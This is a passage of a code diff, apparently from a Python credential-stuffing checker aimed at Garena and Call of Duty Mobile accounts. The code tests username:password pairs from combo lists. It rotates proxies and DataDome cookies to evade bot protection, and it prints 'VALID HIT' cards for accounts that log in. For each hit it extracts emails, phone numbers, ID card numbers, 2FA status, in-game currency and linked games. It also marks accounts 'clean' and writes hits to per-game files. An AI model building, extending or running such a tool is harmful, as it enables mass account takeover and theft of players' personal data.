+        old_callback_url = f'https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}'
+        old_headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36', 'referer': 'https://auth.garena.com/'}
+        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=6)
         location = old_response.headers.get('Location', '')
         if 'err=3' in location:
             return (None, 'no_codm')
         elif 'token=' in location:
             token = location.split('token=')[-1].split('&')[0]
             return (token, 'success')
-        aos_url = (
-            f'https://api-delete-request-aos.codm.garena.co.id/'
-            f'oauth/callback/?access_token={access_token}'
-        )
-        aos_headers = {
-            'accept': (
-                'text/html,application/xhtml+xml,'
-                'application/xml;q=0.9,*/*;q=0.8'
-            ),
-            'user-agent': (
-                'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F '
-                'Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 '
-                '(KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 '
-                'Mobile Safari/537.36'
-            ),
-            'referer': 'https://100082.connect.garena.com/',
-            'x-requested-with': 'com.garena.game.codm'
-        }
-        aos_response = session.get(
-            aos_url,
-            headers=aos_headers,
-            allow_redirects=False,
-            timeout=15
-        )
+        aos_callback_url = f'https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}'
+        aos_headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36', 'referer': 'https://100082.connect.garena.com/', 'x-requested-with': 'com.garena.game.codm'}
+        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=6)
         aos_location = aos_response.headers.get('Location', '')
         if 'err=3' in aos_location:
             return (None, 'no_codm')
@@ -2723,9 +2596,10 @@ def callback(session, access_token, open_id=None, uid=None):
     except Exception:
         return (None, 'error')
 
-def decode_token(session, token):
+def get_codm_user_info(session, token):
     try:
         try:
+            import base64
             parts = token.split('.')
             if len(parts) == 3:
                 payload = parts[1]
@@ -2736,155 +2610,61 @@ def decode_token(session, token):
                 jwt_data = json.loads(decoded)
                 user_data = jwt_data.get('user', {})
                 if user_data:
-                    return {
-                        'codm_nickname': user_data.get(
-                            'codm_nickname',
-                            user_data.get('nickname', 'N/A')
-                        ),
-                        'codm_level': user_data.get('codm_level', 'N/A'),
-                        'region': user_data.get('region', 'N/A'),
-                        'uid': user_data.get('uid', 'N/A'),
-                        'open_id': user_data.get('open_id', 'N/A'),
-                        't_open_id': user_data.get('t_open_id', 'N/A')
-                    }
+                    return {'codm_nickname': user_data.get('codm_nickname', user_data.get('nickname', 'N/A')), 'codm_level': user_data.get('codm_level', 'N/A'), 'region': user_data.get('region', 'N/A'), 'uid': user_data.get('uid', 'N/A'), 'open_id': user_data.get('open_id', 'N/A'), 't_open_id': user_data.get('t_open_id', 'N/A')}
         except Exception:
             pass
-        url = (
-            'https://api-delete-request-aos.codm.garena.co.id/'
-            'oauth/check_login/'
-        )
-        headers = {
-            'accept': 'application/json, text/plain, */*',
-            'codm-delete-token': token,
-            'origin': 'https://delete-request-aos.codm.garena.co.id',
-            'referer': 'https://delete-request-aos.codm.garena.co.id/',
-            'user-agent': (
-                'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F '
-                'Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 '
-                '(KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 '
-                'Mobile Safari/537.36'
-            ),
-            'x-requested-with': 'com.garena.game.codm'
-        }
-        response = session.get(url, headers=headers, timeout=15)
+        url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/'
+        headers = {'accept': 'application/json, text/plain, */*', 'codm-delete-token': token, 'origin': 'https://delete-request-aos.codm.garena.co.id', 'referer': 'https://delete-request-aos.codm.garena.co.id/', 'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36', 'x-requested-with': 'com.garena.game.codm'}
+        response = session.get(url, headers=headers, timeout=6)
         data = response.json()
         user_data = data.get('user', {})
         if user_data:
-            return {
-                'codm_nickname': user_data.get('codm_nickname', 'N/A'),
-                'codm_level': user_data.get('codm_level', 'N/A'),
-                'region': user_data.get('region', 'N/A'),
-                'uid': user_data.get('uid', 'N/A'),
-                'open_id': user_data.get('open_id', 'N/A'),
-                't_open_id': user_data.get('t_open_id', 'N/A')
-            }
+            return {'codm_nickname': user_data.get('codm_nickname', 'N/A'), 'codm_level': user_data.get('codm_level', 'N/A'), 'region': user_data.get('region', 'N/A'), 'uid': user_data.get('uid', 'N/A'), 'open_id': user_data.get('open_id', 'N/A'), 't_open_id': user_data.get('t_open_id', 'N/A')}
         return {}
     except Exception:
         return {}
 
-def inspect(session, account):
+def check_codm_account(session, account):
     codm_info = {}
     has_codm = False
     try:
-        access_token, open_id, uid = acquire_codm(session)
+        access_token, open_id, uid = get_codm_access_token(session)
         if not access_token:
             return (has_codm, codm_info)
-        codm_token, status = callback(session, access_token, open_id, uid)
+        codm_token, status = process_codm_callback(session, access_token, open_id, uid)
         if status == 'no_codm':
             return (has_codm, codm_info)
         elif status != 'success' or not codm_token:
             return (has_codm, codm_info)
-        codm_info = decode_token(session, codm_token)
+        codm_info = get_codm_user_info(session, codm_token)
         if codm_info:
             has_codm = True
     except Exception:
         pass
     return (has_codm, codm_info)
 
-def dissect(data):
+def parse_account_details(data):
     user_info = data.get('user_info', {})
     fb_username = 'N/A'
     fb_uid = 'N/A'
     if user_info.get('fb_account'):
         fb_username = user_info.get('fb_account', {}).get('fb_username', 'N/A')
         fb_uid = user_info.get('fb_account', {}).get('fb_uid', 'N/A')
-    account_info = {
-        'uid': user_info.get('uid', 'N/A'),
-        'username': user_info.get('username', 'N/A'),
-        'nickname': user_info.get('nickname', 'N/A'),
-        'email': user_info.get('email', 'N/A'),
-        'email_verified': bool(user_info.get('email_v', 0)),
-        'email_verified_time': user_info.get('email_verified_time', 0),
-        'email_verify_available': bool(
-            user_info.get('email_verify_available', False)
-        ),
-        'security': {
-            'password_strength': user_info.get('password_s', 'N/A'),
-            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
-            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
-            'facebook_connected': bool(
-                user_info.get('is_fbconnect_enabled', False)
-            ),
-            'facebook_account': user_info.get('fb_account', None),
-            'suspicious': bool(user_info.get('suspicious', False))
-        },
-        'personal': {
-            'real_name': user_info.get('realname', 'N/A'),
-            'id_card': user_info.get('idcard', 'N/A'),
-            'id_card_length': user_info.get('idcard_length', 'N/A'),
-            'country': user_info.get('acc_country', 'N/A'),
-            'country_code': user_info.get('country_code', 'N/A'),
-            'mobile_no': user_info.get('mobile_no', 'N/A'),
-            'mobile_binding_status': (
-                'Bound' if user_info.get('mobile_binding_status', 0)
-                else 'Not Bound'
-            ),
-            'extra_data': user_info.get('realinfo_extra_data', {})
-        },
-        'profile': {
-            'avatar': user_info.get('avatar', 'N/A'),
-            'signature': user_info.get('signature', 'N/A'),
-            'shell_balance': user_info.get('shell', 0)
-        },
-        'status': {
-            'account_status': (
-                'Active' if user_info.get('status', 0) == 1 else 'Inactive'
-            ),
-            'whitelistable': bool(user_info.get('whitelistable', False)),
-            'realinfo_updatable': bool(
-                user_info.get('realinfo_updatable', False)
-            )
-        },
-        'facebook': {'fb_username': fb_username, 'fb_uid': fb_uid},
-        'binds': [],
-        'game_info': []
-    }
+    account_info = {'uid': user_info.get('uid', 'N/A'), 'username': user_info.get('username', 'N/A'), 'nickname': user_info.get('nickname', 'N/A'), 'email': user_info.get('email', 'N/A'), 'email_verified': bool(user_info.get('email_v', 0)), 'email_verified_time': user_info.get('email_verified_time', 0), 'email_verify_available': bool(user_info.get('email_verify_available', False)), 'security': {'password_strength': user_info.get('password_s', 'N/A'), 'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)), 'authenticator_app': bool(user_info.get('authenticator_enable', 0)), 'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)), 'facebook_account': user_info.get('fb_account', None), 'suspicious': bool(user_info.get('suspicious', False))}, 'personal': {'real_name': user_info.get('realname', 'N/A'), 'id_card': user_info.get('idcard', 'N/A'), 'id_card_length': user_info.get('idcard_length', 'N/A'), 'country': user_info.get('acc_country', 'N/A'), 'country_code': user_info.get('country_code', 'N/A'), 'mobile_no': user_info.get('mobile_no', 'N/A'), 'mobile_binding_status': 'Bound' if user_info.get('mobile_binding_status', 0) else 'Not Bound', 'extra_data': user_info.get('realinfo_extra_data', {})}, 'profile': {'avatar': user_info.get('avatar', 'N/A'), 'signature': user_info.get('signature', 'N/A'), 'shell_balance': user_info.get('shell', 0)}, 'status': {'account_status': 'Active' if user_info.get('status', 0) == 1 else 'Inactive', 'whitelistable': bool(user_info.get('whitelistable', False)), 'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))}, 'facebook': {'fb_username': fb_username, 'fb_uid': fb_uid}, 'binds': [], 'game_info': []}
     mobile_no = account_info['personal']['mobile_no']
     email_verified = 1 if account_info['email_verified'] else 0
-    mobile_is_na = (
-        mobile_no == 'N/A'
-        or not mobile_no
-        or str(mobile_no).strip() == ''
-    )
+    mobile_is_na = mobile_no == 'N/A' or not mobile_no or str(mobile_no).strip() == ''
     is_clean = mobile_is_na and email_verified == 0
     email = account_info['email']
     id_card = account_info['personal']['id_card']
-    if (
-        email and email != 'N/A'
-        and str(email).strip()
-        and (not email.startswith('***'))
-    ):
+    if email and email != 'N/A' and str(email).strip() and (not email.startswith('***')):
         if email_verified == 1:
             account_info['binds'].append('Email (Verified)')
         else:
             account_info['binds'].append('Email')
     if not mobile_is_na:
         account_info['binds'].append('Phone')
-    if (
-        account_info['security']['facebook_connected']
-        and fb_uid
-        and (fb_uid != 'N/A')
-    ):
+    if account_info['security']['facebook_connected'] and fb_uid and (fb_uid != 'N/A'):
         account_info['binds'].append('Facebook')
     if id_card and id_card != 'N/A' and str(id_card).strip():
         account_info['binds'].append('ID Card')
@@ -2892,11 +2672,7 @@ def dissect(data):
         account_info['binds'].append('2FA')
     if account_info['security']['authenticator_app']:
         account_info['binds'].append('Authenticator')
-    account_info['bind_status'] = (
-        'Clean' if is_clean
-        else 'Not Clean' if account_info['binds']
-        else 'Not Clean'
-    )
+    account_info['bind_status'] = 'Clean' if is_clean else f'Not Clean' if account_info['binds'] else 'Not Clean'
     account_info['is_clean'] = is_clean
     security_indicators = []
     if account_info['security']['two_step_verify']:
@@ -2905,178 +2681,152 @@ def dissect(data):
         security_indicators.append('Auth App')
     if account_info['security']['suspicious']:
         security_indicators.append('[WARNING] Suspicious')
-    account_info['security_status'] = (
-        '[SUCCESS] Normal'
-        if not security_indicators
-        else ' | '.join(security_indicators)
-    )
+    account_info['security_status'] = '[SUCCESS] Normal' if not security_indicators else ' | '.join(security_indicators)
     return account_info
 
-def reveal(
-    account, password, details, codm_info, has_codm,
-    error_reason=None, game_connections=None, is_elegant=False
-):
-    global active
+def display_codm_info(account, password, details, codm_info, has_codm,
+                      error_reason=None, game_connections=None, is_elegant=False):
+    """Print a result card, then restore the pinned dashboard above/below."""
+    global _active_dashboard
 
-    if details is None and not is_elegant:
+    # Bulk dashboard is active: the live feed covers results, so no scrolling cards
+    if _active_dashboard:
         return
 
-    with dashlock:
-        if active:
-            dash_str = active.render()
-            dash_lines = dash_str.count('\n') + 1
-            sys.stdout.write(f'\x1b[{dash_lines}A\x1b[0J')
-            sys.stdout.flush()
+    # ── Color shortcuts
+    CY  = '\x1b[96m'
+    MG  = '\x1b[95m'
+    GN  = '\x1b[1;92m'
+    YL  = '\x1b[1;93m'
+    WH  = '\x1b[97m'
+    DIM = '\x1b[2m'
+    RST = '\x1b[0m'
+    SEP65 = DIM + ('\u2501' * 65) + RST   # thick dim rule
+    DIV65 = DIM + ('\u2500' * 65) + RST   # thin dim rule
 
-        if details is None:
-            if error_reason is None:
-                error_reason = 'Incorrect Password'
-
-            rprint(f"\n[dim]{'━' * 65}[/dim]")
-            rprint(
-                f"[bold bright_red]✖ INVALID HIT[/bold bright_red]  "
-                f"[dim]│[/dim]  [bold white]{account}:{password}[/bold white]"
-            )
-            rprint(f"[dim]{'─' * 65}[/dim]")
-            rprint(
-                f" [dim]•[/dim] [cyan]Reason   :[/cyan] "
-                f"[yellow]{error_reason}[/yellow]"
-            )
-            rprint(f"[dim]{'━' * 65}[/dim]\n")
-
-            if active:
-                sys.stdout.write(active.render() + '\n')
-                sys.stdout.flush()
-            return
-
-        email = details.get('email', 'N/A')
-        email_verified = details.get('email_verified', False)
-        username = details.get('username', 'N/A')
-        mobile_n = details['personal'].get('mobile_no', 'N/A')
-        country_code = details['personal'].get('country_code', 'N/A')
-        shell = details['profile'].get('shell_balance', 0)
-        is_clean = details.get('is_clean', False)
-        bind_status = 'CLEAN' if is_clean else 'NOT CLEAN'
-        formatted_mobile = mask(mobile_n, country_code)
-
-        if email and email != 'N/A' and ('@' in email):
-            verification_status = (
-                '(Verified)' if email_verified else '(Not Verified)'
-            )
-            email_display = f'{email} {verification_status}'
+    # ── INVALID path ────────────────────────────────────────────────────
+    if details is None:
+        if error_reason is None:
+            error_reason = 'Incorrect Password'
+        line = (f'  \x1b[1;91m\u2716 INVALID\x1b[0m'
+                f'  {DIM}\u2502{RST}'
+                f'  {WH}{account}:{password}{RST}'
+                f'  {DIM}\u2502{RST}'
+                f'  \x1b[93m{error_reason}\x1b[0m')
+        if _active_dashboard:
+            _active_dashboard.print_above(line)
         else:
-            email_display = 'N/A'
+            with _dash_print_lock:
+                _raw_write(line + '\n')
+                _raw_flush()
+        return
 
-        fb_username = details['facebook'].get('fb_username', 'N/A')
-        fb_uid = details['facebook'].get('fb_uid', 'N/A')
-        if fb_uid == 'N/A' or not fb_uid:
-            fb_info = 'NOT CONNECTED'
-        elif not fb_username or fb_username == 'N/A':
-            fb_info = 'FB UNBIND or FB DELETED'
-        else:
-            fb_info = 'CONNECTED'
+    # ── Gather account fields ────────────────────────────────────────────
+    email          = details.get('email', 'N/A')
+    email_verified = details.get('email_verified', False)
+    username       = details.get('username', 'N/A')
+    mobile         = details['personal'].get('mobile_no', 'N/A')
+    country_code   = details['personal'].get('country_code', 'N/A')
+    shell          = details['profile'].get('shell_balance', 0)
+    is_clean       = details.get('is_clean', False)
+    bind_status    = 'CLEAN' if is_clean else 'NOT CLEAN'
+    formatted_mob  = format_mobile_number(mobile, country_code)
 
-        login_history = details.get('login_history', [])
-        last_login_info = login_history[0] if login_history else {}
-        last_login = last_login_info.get('timestamp', 0)
-        last_login_date = (
-            time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_login))
-            if last_login else 'N/A'
-        )
-        last_login_where = (
-            f"{last_login_info.get('source', 'Unknown')}"
-            if last_login_info else 'Unknown'
-        )
+    if email and email != 'N/A' and '@' in email:
+        ev_s          = '(Verified)' if email_verified else '(Not Verified)'
+        email_display = f'{email} {ev_s}'
+    else:
+        email_display = 'N/A'
 
-        lvl = 'N/A'
-        server = 'N/A'
-        ign = 'N/A'
-        uid = details.get('uid', 'N/A')
+    fb_username = details['facebook'].get('fb_username', 'N/A')
+    fb_uid      = details['facebook'].get('fb_uid', 'N/A')
+    if not fb_uid or fb_uid == 'N/A':
+        fb_info = 'NOT CONNECTED'
+    elif not fb_username or fb_username == 'N/A':
+        fb_info = 'FB UNBIND or FB DELETED'
+    else:
+        fb_info = 'CONNECTED'
 
-        if has_codm and codm_info:
-            lvl = codm_info.get('codm_level', 'N/A')
-            server = codm_info.get('region', 'N/A')
-            ign = codm_info.get('codm_nickname', 'N/A')
-            uid = codm_info.get('uid', uid)
-        else:
-            lvl = 'NO CODM'
-            server = 'NO CODM'
-            ign = 'NO CODM'
+    login_history   = details.get('login_history', [])
+    last_login_info = login_history[0] if login_history else {}
+    last_ts         = last_login_info.get('timestamp', 0)
+    last_login_date = (time.strftime('%B %d, %Y | %I:%M %p', time.localtime(last_ts))
+                       if last_ts else 'N/A')
+    last_login_src  = last_login_info.get('source', 'Unknown') if last_login_info else 'Unknown'
 
-        rprint(f"\n[dim]{'━' * 65}[/dim]")
-        rprint(
-            f"[bold bright_green]✔ VALID HIT[/bold bright_green]  "
-            f"[dim]│[/dim]  [bold white]{account}:{password}[/bold white]"
-        )
-        rprint(f"[dim]{'─' * 65}[/dim]")
-        rprint(f" [dim]•[/dim] [cyan]Username :[/cyan] [white]{username}[/white]")
-        rprint(
-            f" [dim]•[/dim] [cyan]Shells   :[/cyan] "
-            f"[bold bright_yellow]{shell}[/bold bright_yellow]"
-        )
-        rprint(f" [dim]•[/dim] [cyan]Email    :[/cyan] [white]{email_display}[/white]")
-        rprint(f" [dim]•[/dim] [cyan]Mobile   :[/cyan] [white]{formatted_mobile}[/white]")
-        rprint(f" [dim]•[/dim] [cyan]Facebook :[/cyan] [white]{fb_info}[/white]")
-        rprint(f"[dim]{'─' * 65}[/dim]")
-        rprint(f" [bold bright_cyan]◈ CODM DETAILS[/bold bright_cyan]")
-        rprint(f" [dim]•[/dim] [cyan]IGN      :[/cyan] [white]{ign}[/white]")
-        rprint(f" [dim]•[/dim] [cyan]Level    :[/cyan] [white]{lvl}[/white]")
-        rprint(f" [dim]•[/dim] [cyan]Server   :[/cyan] [white]{server}[/white]")
-        rprint(f" [dim]•[/dim] [cyan]UID      :[/cyan] [white]{uid}[/white]")
-        rprint(f"[dim]{'─' * 65}[/dim]")
-        status_color = 'bright_green' if is_clean else 'yellow'
-        rprint(
-            f" [dim]•[/dim] [cyan]Status   :[/cyan] "
-            f"[bold {status_color}]{bind_status}[/bold {status_color}]"
-        )
-        rprint(
-            f" [dim]•[/dim] [cyan]Last Log :[/cyan] [white]{last_login_date}[/white] "
-            f"[dim]({last_login_where})[/dim]"
-        )
+    uid = details.get('uid', 'N/A')
+    if has_codm and codm_info:
+        lvl    = codm_info.get('codm_level', 'N/A')
+        server = codm_info.get('region', 'N/A')
+        ign    = codm_info.get('codm_nickname', 'N/A')
+        uid    = codm_info.get('uid', uid)
+    else:
+        lvl = server = ign = 'NO CODM'
 
-        if game_connections:
-            rprint(f"[dim]{'─' * 65}[/dim]")
-            rprint(f" [bold bright_magenta]◈ OTHER GAMES[/bold bright_magenta]")
-            for gc in game_connections:
-                rprint(
-                    f" [dim]•[/dim] [magenta]{gc.get('game', 'Game')}:[/magenta] "
-                    f"[white]{gc.get('role', 'Unknown')} "
-                    f"({gc.get('region', 'N/A')})[/white]"
-                )
+    st_col = GN if is_clean else YL
 
-        rprint(f"[dim]{'━' * 65}[/dim]\n")
+    # ── Build card ───────────────────────────────────────────────────────
+    B = DIM + '\u2022' + RST   # bullet •
+    card_lines = [
+        SEP65,
+        f'{GN}\u2714 VALID HIT{RST}  {DIM}\u2502{RST}  {WH}{account}:{password}{RST}',
+        DIV65,
+        f' {B} {CY}Username :{RST} {WH}{username}{RST}',
+        f' {B} {CY}Shells   :{RST} {YL}{shell}{RST}',
+        f' {B} {CY}Email    :{RST} {WH}{email_display}{RST}',
+        f' {B} {CY}Mobile   :{RST} {WH}{formatted_mob}{RST}',
+        f' {B} {CY}Facebook :{RST} {WH}{fb_info}{RST}',
+        DIV65,
+        f' {CY}\u25C8 CODM DETAILS{RST}',
+        f' {B} {CY}IGN      :{RST} {WH}{ign}{RST}',
+        f' {B} {CY}Level    :{RST} {WH}{lvl}{RST}',
+        f' {B} {CY}Server   :{RST} {WH}{server}{RST}',
+        f' {B} {CY}UID      :{RST} {WH}{uid}{RST}',
+        DIV65,
+        f' {B} {CY}Status   :{RST} {st_col}{bind_status}{RST}',
+        f' {B} {CY}Last Log :{RST} {WH}{last_login_date}{RST} {DIM}({last_login_src}){RST}',
+    ]
 
-        if active:
-            sys.stdout.write(active.render() + '\n')
-            sys.stdout.flush()
+    if game_connections:
+        card_lines.append(DIV65)
+        card_lines.append(f' {MG}\u25C8 OTHER GAMES{RST}')
+        for gc in game_connections:
+            card_lines.append(
+                f' {B} {MG}{gc.get("game","Game")}:{RST} '
+                f'{WH}{gc.get("role","Unknown")} ({gc.get("region","N/A")}){RST}'
+            )
 
-def spectate(
-    account, password, details, codm_info, has_codm,
-    error_reason=None, game_connections=None
-):
-    reveal(
-        account, password, details, codm_info, has_codm,
-        error_reason, game_connections, is_elegant=True
-    )
+    card_lines.append(SEP65)
 
-purgequeue = []
-purgelock = threading.Lock()
-purgebatch = 50
+    card_text = '\n'.join(card_lines)
 
-def flush(vault, combo_file_path, force=False):
-    with purgelock:
-        if not purgequeue:
+    if _active_dashboard:
+        _active_dashboard.print_above(card_text)
+    else:
+        with _dash_print_lock:
+            _raw_write(card_text + '\n')
+            _raw_flush()
+
+def display_codm_info_elegant(account, password, details, codm_info, has_codm, error_reason=None, game_connections=None):
+    display_codm_info(account, password, details, codm_info, has_codm, error_reason, game_connections, is_elegant=True)
+_auto_remove_queue = []
+_auto_remove_lock = threading.Lock()
+_auto_remove_batch = 50
+
+def _flush_auto_remove(file_manager, combo_file_path, force=False):
+    with _auto_remove_lock:
+        if not _auto_remove_queue:
             return
-        if not force and len(purgequeue) < purgebatch:
+        if not force and len(_auto_remove_queue) < _auto_remove_batch:
             return
-        batch = list(purgequeue)
-        purgequeue.clear()
+        batch = list(_auto_remove_queue)
+        _auto_remove_queue.clear()
     if not batch:
         return
-    target_set = set(b.strip() for b in batch)
+    target_set = set((b.strip() for b in batch))
     try:
         fp = Path(combo_file_path)
-        with vault.lock:
+        with file_manager._file_lock:
             with open(fp, 'r', encoding='utf-8', errors='ignore') as fh:
                 lines = fh.readlines()
             with open(fp, 'w', encoding='utf-8') as fh:
@@ -3086,477 +2836,420 @@ def flush(vault, combo_file_path, force=False):
     except Exception:
         pass
 
-def enqueue(account, password, vault, combo_file_path):
-    with purgelock:
-        purgequeue.append(f'{account}:{password}')
-    if len(purgequeue) >= purgebatch:
-        threading.Thread(
-            target=flush,
-            args=(vault, combo_file_path),
-            daemon=True
-        ).start()
+def _queue_auto_remove(account, password, file_manager, combo_file_path):
+    with _auto_remove_lock:
+        _auto_remove_queue.append(f'{account}:{password}')
+    if len(_auto_remove_queue) >= _auto_remove_batch:
+        threading.Thread(target=_flush_auto_remove, args=(file_manager, combo_file_path), daemon=True).start()
 
-def process(
-    session, account, password, cookie_manager, datadome_manager,
-    stats, scribe, vault, combo_file_path, auto_remove,
-    use_elegant_display=False, suppress_print=False,
-    proxy_manager=None
-):
-    ceiling = 15
+
+def get_game_connections(session, account):
+    """Fetch Garena game connections for the given account.
+
+    Returns a list of dicts: [{'game': str, 'role': str, 'region': str}, ...]
+    Returns an empty list on any failure (caller treats empty as 'no games').
+    """
+    try:
+        headers = {
+            'accept': 'application/json, text/plain, */*',
+            'referer': 'https://account.garena.com/',
+            'user-agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
+                           'AppleWebKit/537.36 (KHTML, like Gecko) '
+                           'Chrome/129.0.0.0 Safari/537.36'),
+        }
+        cookie_parts = []
+        for k in ('apple_state_key', 'datadome', 'sso_key', 'ac_session', 'session_key'):
+            v = session.cookies.get(k)
+            if v:
+                cookie_parts.append(f'{k}={v}')
+        if cookie_parts:
+            headers['cookie'] = '; '.join(cookie_parts)
+
+        resp = session.get(
+            'https://account.garena.com/api/account/connections',
+            headers=headers, timeout=6,
+        )
+        if resp.status_code != 200:
+            return []
+        try:
+            data = resp.json()
+        except json.JSONDecodeError:
+            return []
+
+        connections = []
+        raw = data.get('connections') or data.get('game_connections') or []
+        if isinstance(raw, list):
+            for item in raw:
+                if not isinstance(item, dict):
+                    continue
+                connections.append({
+                    'game':   item.get('game') or item.get('name') or 'Unknown',
+                    'role':   item.get('role') or item.get('role_name') or 'N/A',
+                    'region': item.get('region') or item.get('country') or 'N/A',
+                })
+        return connections
+    except Exception:
+        return []
+
+
+def save_game_folder(account, password, account_data, game_connections, base_dir):
+    """Persist any non-CODM game connections into per-game txt files.
+
+    Creates a 'Games' subdirectory under base_dir and writes one file per
+    game (using GAME_FILE_MAP for filename mapping). Each line is
+    'account:password | role (region)'. Safe to call when game_connections
+    is empty — it will simply do nothing.
+    """
+    try:
+        if not game_connections:
+            return
+        games_dir = Path(base_dir) / 'Games'
+        games_dir.mkdir(parents=True, exist_ok=True)
+
+        for gc in game_connections:
+            gname = (gc.get('game') or 'Unknown').strip()
+            gname_upper = gname.upper()
+            if gname_upper == 'FREE FIRE':
+                gname_upper = 'FREEFIRE'
+            file_name = GAME_FILE_MAP.get(gname_upper)
+            if not file_name:
+                safe = re.sub(r'[^A-Za-z0-9_-]+', '_', gname).strip('_') or 'Unknown'
+                file_name = f'{safe}.txt'
+
+            role = gc.get('role', 'N/A')
+            region = gc.get('region', 'N/A')
+            line = f'{account}:{password} | {role} ({region})'
+            target = games_dir / file_name
+            with open(target, 'a', encoding='utf-8') as fh:
+                fh.write(line + '\n')
+    except Exception:
+        pass
+
+
+def processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, results_manager, file_manager, combo_file_path, auto_remove, use_elegant_display=False, suppress_print=False, proxy_manager=None, defer_transient=False):
+    max_retries = 4
     attempt = 0
-
+    _tried_cached = False
+    
     def _display(acc, pwd, det, codm, has, err=None, gc=None):
         if not suppress_print:
-            (spectate if use_elegant_display else reveal)(
-                acc, pwd, det, codm, has, err, gc
-            )
-
+            (display_codm_info_elegant if use_elegant_display else display_codm_info)(acc, pwd, det, codm, has, err, gc)
+    
     while True:
         attempt += 1
         try:
             datadome_manager.tick_request()
             session.cookies.clear()
-            seed(session)
+            init_ga_cookies(session)
             datadome_manager.clear_session_datadome(session)
             current_datadome = datadome_manager.get_datadome()
             if current_datadome:
                 datadome_manager.set_session_datadome(session, current_datadome)
             else:
-                saved_ck = cookie_manager.pick()
+                saved_ck = cookie_manager.pick_cookie()
                 if saved_ck:
-                    instill(session, saved_ck)
-                    val = pluck(saved_ck)
+                    applyck(session, saved_ck)
+                    val = extract_datadome_token(saved_ck)
                     if val:
                         datadome_manager.set_datadome(val)
                         datadome_manager.set_session_datadome(session, val)
                 else:
-                    proxy_dict = (
-                        dict(session.proxies)
-                        if hasattr(session, 'proxies') and session.proxies
-                        else None
-                    )
-                    datadome = garner(session, proxies_arg=proxy_dict)
+                    proxy_dict = dict(session.proxies) if hasattr(session, 'proxies') and session.proxies else None
+                    datadome = get_datadome_cookie(session, proxies=proxy_dict)
                     if datadome:
                         datadome_manager.set_datadome(datadome)
                         datadome_manager.set_session_datadome(session, datadome)
 
-            v1, v2, new_datadome = probe(
-                session, account, datadome_manager, cookie_manager,
-                proxy_manager=proxy_manager
-            )
+            v1, v2, new_datadome = prelogin(session, account, datadome_manager, cookie_manager, proxy_manager=proxy_manager)
 
             if v1 == 'IP_BLOCKED':
-                if proxy_manager and proxy_manager.ready():
+                if proxy_manager and proxy_manager.is_loaded():
                     session.proxies.clear()
-                    session.proxies.update(proxy_manager.next())
-                    if attempt <= ceiling:
+                    session.proxies.update(proxy_manager.get_next())
+                    if attempt <= max_retries:
                         continue
                 if datadome_manager.wait_for_ip_change(session):
                     session.close()
-                    session = forge()
+                    session = _make_session()
                     session.cookies.clear()
-                    seed(session)
+                    init_ga_cookies(session)
                     datadome_manager.clear_session_datadome(session)
                     return 'IP_CHANGED'
                 else:
-                    stats.accrue(is_error=True)
-                    account_data = {
-                        'account': account,
-                        'password': password,
-                        'is_error': True,
-                        'error_reason': 'IP Change Timeout'
-                    }
-                    scribe.add(account_data)
-                    if auto_remove:
-                        enqueue(account, password, vault, combo_file_path)
-                    return 'ERROR'
+                    # IP never changed — rate-limiting, not an account verdict.
+                    # Silently return IP_BLOCKED so _wrapped_worker can skip it
+                    # without pushing noise into the feed; account stays in the
+                    # combo file for a re-run.
+                    return 'IP_BLOCKED'
 
             if v1 == 'NETWORK_ERROR':
-                if attempt < ceiling:
-                    backoff = min(2 ** attempt, 30) + random.uniform(0, 2)
-                    if proxy_manager and proxy_manager.ready():
+                # Silent retry. Rebuild the session (dead keep-alive / stale socket
+                # is the common cause) and rotate datadome/proxy, then retry a bit
+                # longer than the default so a flaky connection resolves itself.
+                if attempt < max_retries + 2:
+                    try:
+                        session.close()
+                    except Exception:
+                        pass
+                    session = _make_session()
+                    init_ga_cookies(session)
+                    datadome_manager.clear_session_datadome(session)
+                    if proxy_manager and proxy_manager.is_loaded():
                         try:
-                            session.proxies.clear()
-                            session.proxies.update(proxy_manager.next())
+                            session.proxies.update(proxy_manager.get_next())
                         except Exception:
                             pass
-                    if not suppress_print:
-                        print(
-                            f'  {yl}⚠  Network error — rotating proxy, '
-                            f'backoff {backoff:.1f}s ({attempt}/{ceiling}){rst}'
-                        )
-                    time.sleep(backoff)
+                    # Try a fresh datadome cookie too — banned one shows as reset.
+                    try:
+                        picked_ck = cookie_manager.pick_cookie()
+                        if picked_ck:
+                            applyck(session, picked_ck)
+                            val = extract_datadome_token(picked_ck)
+                            if val:
+                                datadome_manager.set_datadome(val)
+                                datadome_manager.set_session_datadome(session, val)
+                    except Exception:
+                        pass
+                    time.sleep(random.uniform(0.2, 0.6))
                     continue
-                err_data = {
-                    'account': account,
-                    'password': password,
-                    'is_error': True,
-                    'error_reason': 'Network Error'
-                }
-                stats.accrue(is_error=True)
-                scribe.add(err_data)
-                stats.push(success=False, error_reason='Network Error')
-                if auto_remove:
